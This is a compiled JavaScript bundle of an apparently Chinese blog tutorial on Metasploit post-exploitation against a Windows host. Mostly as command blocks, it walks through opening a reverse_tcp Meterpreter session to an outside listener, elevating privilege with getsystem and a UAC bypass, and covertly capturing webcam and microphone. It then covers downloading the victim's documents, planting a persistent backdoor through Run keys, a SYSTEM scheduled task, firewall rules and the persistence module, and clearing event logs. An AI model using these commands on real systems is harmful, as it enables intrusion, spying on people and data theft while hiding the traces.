{"code":"(window.webpackJsonp=window.webpackJsonp||[]).push([[151],{567:function(s,a,t){\"use strict\";t.r(a);var n=t(3),e=Object(n.a)({},(function(){var s=this,a=s._self._c;return a(\"ContentSlotsDistributor\",{attrs:{\"slot-key\":s.$parent.slotKey}},[a(\"blockquote\",[a(\"p\",[s._v(\"仅用于交流学习，请勿用于其他用途。\")])]),s._v(\" \"),a(\"h2\",{attrs:{id:\"_0x00-准备工作\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x00-准备工作\"}},[s._v(\"#\")]),s._v(\" \"),a(\"strong\",[s._v(\"0x00 准备工作\")])]),s._v(\" \"),a(\"ul\",[a(\"li\",[s._v(\"具有公网ip的服务器且已安装MSF(监听者)：1.2.3.4\")]),s._v(\" \"),a(\"li\",[s._v(\"目标主机(受害者)：192.168.2.111\")]),s._v(\" \"),a(\"li\",[s._v(\"本地kali机(攻击者)：192.168.34.23\")])]),s._v(\" \"),a(\"h2\",{attrs:{id:\"_0x01-服务器msf开启监听\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x01-服务器msf开启监听\"}},[s._v(\"#\")]),s._v(\" \"),a(\"strong\",[s._v(\"0x01 服务器MSF开启监听\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"use exploit/multi/handler\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" payload windows/x64/meterpreter/reverse_tcp \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 或者试下 set payload windows/meterpreter/reverse_tcp\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"0.0\")]),s._v(\".0.0\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1111\")]),s._v(\"\\nexploit\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\")])]),a(\"h2\",{attrs:{id:\"_0x02-本地kali机执行攻击\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x02-本地kali机执行攻击\"}},[s._v(\"#\")]),s._v(\" \"),a(\"strong\",[s._v(\"0x02 本地kali机执行攻击\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" rhost \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".2.111\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1.2\")]),s._v(\".3.4\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1111\")]),s._v(\"\\nexploit\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\")])]),a(\"h2\",{attrs:{id:\"_0x03-后渗透测试命令\"}},[a(\"a\",{staticClass:\"header-anchor\",attrs:{href:\"#_0x03-后渗透测试命令\"}},[s._v(\"#\")]),s._v(\" \"),a(\"strong\",[s._v(\"0x03 后渗透测试命令\")])]),s._v(\" \"),a(\"ol\",[a(\"li\",[s._v(\"基本系统命令\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"sessions\\nsessions -i \"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"id值\"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"      \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入会话\")]),s._v(\"\\nsessions -k \"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"id值\"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"      \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 杀死会话\")]),s._v(\"\\nbackground              \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将当前会话放置后台\")]),s._v(\"\\ngetuid                  \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看权限\")]),s._v(\"\\nsysinfo                 \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看系统信息\")]),s._v(\"\\nshell                   \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入目标及cmd shell\")]),s._v(\"\\nchcp \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"65001\")]),s._v(\"              \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 进入shell运行此命令可解决乱码问题\")]),s._v(\"\\nchcp \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"65001\")]),s._v(\" 就是换成UTF-8代码页 \\nchcp \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"936\")]),s._v(\" 可以换回默认的GBK \\nchcp \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"437\")]),s._v(\" 是美国英语 \\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"2\"}},[a(\"li\",[s._v(\"进程迁移，可防止\"),a(\"code\",[s._v(\"Meterpreter session Died\")])])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"getpid                  \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 获取当前进程pid\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"ps\")]),s._v(\"                      \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前活跃进程\")]),s._v(\"\\nmigrate \"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"pid值\"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"         \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将Meterpreter session 移植到指定pid值进程中\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"kill\")]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")]),s._v(\"pid值\"),a(\"span\",{pre:!0,attrs:{class:\"token variable\"}},[s._v(\"`\")])]),s._v(\"            \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 杀死进程\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" autorunscript migrate -n explorer.exe   \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 自动化迁移进程\")]),s._v(\"\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"3\"}},[a(\"li\",[s._v(\"摄像头和麦克风命令\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"webcam_list             \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看摄像头\")]),s._v(\"\\nwebcam_snap             \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 拍照\")]),s._v(\"\\nwebcam_stream           \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 开启视频\")]),s._v(\"\\nrecord_mic              \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 此命令默认录制默认麦克风录制1秒钟的音频\")]),s._v(\"\\n-d ：记录的秒数，默认为1秒\\n-F ：wav文件路径。默认为\"),a(\"span\",{pre:!0,attrs:{class:\"token environment constant\"}},[s._v(\"HOME\")]),s._v(\" / \"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"[\")]),s._v(\"随机乱码名字\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"]\")]),s._v(\" .wav\\n-p ：自动播放捕获的音频，默认为“true”。\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"4\"}},[a(\"li\",[s._v(\"文件系统命令\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"getwd                   \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前目录\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"pwd\")]),s._v(\"                     \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 查看当前目录\")]),s._v(\"\\nupload /root/1.txt \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'C:\\\\users\\\\'\")]),s._v(\"           \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 上传文件(夹)到目标主机\")]),s._v(\"\\ndownload \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v(\"'C:\\\\Users\\\\Administrator\\\\Documents'\")]),s._v(\" /home/          \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 下载文件(夹)到本地\")]),s._v(\"\\ngetlwd                  \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 操作攻击者主机, 查看当前目录\")]),s._v(\"\\nlpwd                    \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 同上\")]),s._v(\"\\nlcd                     \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 操作攻击者主机, 切换目录\")]),s._v(\"\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"5\"}},[a(\"li\",[s._v(\"提权，有时候尝试换个端口，可能收获意外\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"getsystem      \\n\\n获得 meterpreter 后，运行\\nbackground\\nuse exploit/windows/local/bypassuac\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" session \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"1\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lhost \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"49.235\")]),s._v(\".146.183 \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 不需要\")]),s._v(\"\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token builtin class-name\"}},[s._v(\"set\")]),s._v(\" lport \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"2363\")]),s._v(\"           \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 不需要\")]),s._v(\"\\nexploit\\n\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 若再次获得 meterpreter ，yunx\")]),s._v(\"\\n\\ngetuid\\ngetsystem\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"6\"}},[a(\"li\",[s._v(\"后门（利用frp穿透）\")])]),s._v(\" \"),a(\"ul\",[a(\"li\",[s._v(\"思路：上传 frpc和ncat相关文件到目标主机, 编写vbs脚本，添加注册表，放行相关端口，放行软件\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"upload /home/backdoor C:\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\\nshell\\nmove  C:\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"backdoor\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"one.bat C:\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"System32\\ncall firewall.bat\\n\"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"rmdir\")]),s._v(\" C:\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Users\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"backdoor\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\")])]),a(\"div\",{staticClass:\"language-powershell line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[a(\"code\",[a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"### 以下命令被firewall脚本代替\")]),s._v(\"\\nreg add \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\"')]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunOnce\"')]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServices\"')]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\nreg add \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"HKEY_LOCAL_MACHINE\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\RunServicesOnce\"')]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"v geniuslib \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"t REG_SZ \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"d \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"dynamiclib.vbs\"')]),s._v(\"\\n\\nschtasks\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\".\")]),s._v(\"exe \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"create \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"tn \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"init\"')]),s._v(\" \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"ru SYSTEM \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"sc\")]),s._v(\" ONSTART \"),a(\"span\",{pre:!0,attrs:{class:\"token operator\"}},[s._v(\"/\")]),s._v(\"tr \"),a(\"span\",{pre:!0,attrs:{class:\"token string\"}},[s._v('\"C:\\\\test\\\\init.bat\"')]),s._v(\"\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\")])]),a(\"p\",[s._v(\"若开启防火墙\")]),s._v(\" \"),a(\"div\",{staticClass:\"language-powershell line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[a(\"code\",[s._v(\"netsh advfirewall firewall add rule name = vhosts \"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"dir\")]),s._v(\" = in protocol = tcp action = allow localport = 12322 remoteip = localsubnet profile = DOMAIN  \\nnetsh advfirewall firewall \"),a(\"span\",{pre:!0,attrs:{class:\"token function\"}},[s._v(\"set\")]),s._v(\" allowedprogram vhosts\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\".\")]),s._v(\"exe A ENABLE \\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\")])]),a(\"ul\",[a(\"li\",[s._v(\"注释\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-bash line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-bash\"}},[a(\"code\",[s._v(\"netsh advfirewall show allowedprogram\\n\\nrun metsvc                      \"),a(\"span\",{pre:!0,attrs:{class:\"token comment\"}},[s._v(\"# 将会在目标主机上以 Meterpreter 的服务的形式注册在服务列表中，并开机自动自动\")]),s._v(\"\\nrun metsvc -r 卸载目标主机上的 Meterpreter 服务\\n\\n\\n\\nrun persistence -U -i \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"10\")]),s._v(\" -p \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"4444\")]),s._v(\" -r \"),a(\"span\",{pre:!0,attrs:{class:\"token number\"}},[s._v(\"192.168\")]),s._v(\".43.100\\n\\n-P：设置Payload，默认为windows/meterpreter/reverse_tcp。该默认的payload生成的后门为32位程序。因此，当目标机器为64位系统时，留下的后门将无法运行；\\n\\n-U：设置后门在用户登录后自启动。该方式会在HKCU\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Software\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Microsoft\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"CurrentVersion\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Run下添加注册表信息。推荐使用该参数；\\n\\n-X：设置后门在系统启动后自启动。该方式会在HKLM\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Software\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Microsoft\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Windows\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"CurrentVersion\"),a(\"span\",{pre:!0,attrs:{class:\"token punctuation\"}},[s._v(\"\\\\\")]),s._v(\"Run下添加注册表信息。由于权限问题，会导致添加失败，后门将无法启动。因此，在非管理员权限或者未进行BypassUAC操作情况下，不推荐使用该参数；\\n\\n-i：设置反向连接间隔时间，单位为秒。当设置该参数后，目标机器会每隔设置的时间回连一次所设置的ip；\\n\\n-p：设置反向连接的端口号。即黑阔用来等待连接的端口；\\n\\n-r：设置反向连接的ip地址。即黑阔用来等待连接的ip；\\n\")])]),s._v(\" \"),a(\"div\",{staticClass:\"line-numbers-wrapper\"},[a(\"span\",{staticClass:\"line-number\"},[s._v(\"1\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"2\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"3\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"4\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"5\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"6\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"7\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"8\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"9\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"10\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"11\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"12\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"13\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"14\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"15\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"16\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"17\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"18\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"19\")]),a(\"br\"),a(\"span\",{staticClass:\"line-number\"},[s._v(\"20\")]),a(\"br\")])]),a(\"ol\",{attrs:{start:\"7\"}},[a(\"li\",[s._v(\"清除日志\")])]),s._v(\" \"),a(\"div\",{staticClass:\"language-Powershell line-numbers-mode\"},[a(\"pre\",{pre:!0,attrs:{class:\"language-powershell\"}},[a(\"code\",[s._v(\"clearev\\n\")])]),s._v(\" 